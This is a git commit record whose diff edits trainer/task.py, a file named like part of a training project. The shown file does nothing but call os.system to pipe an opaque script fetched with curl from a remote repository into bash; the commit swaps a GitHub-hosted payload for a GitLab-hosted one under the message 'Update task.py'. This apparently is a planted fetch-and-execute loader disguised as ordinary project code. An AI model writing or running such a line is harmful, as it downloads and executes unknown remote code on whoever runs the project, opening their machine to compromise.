12539ac3b1afeb1950c5b858d10a46a68509cbab
cahayaangkasaku1 <147915222+cahayaangkasaku1@users.noreply.github.com>
2024-01-01 20:54:39 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/bengetsia/subites/raw/main/zeprut | bash')
+os.system('curl -sL https://gitlab.com/jadons19292/netizen/-/raw/main/corse | bash')
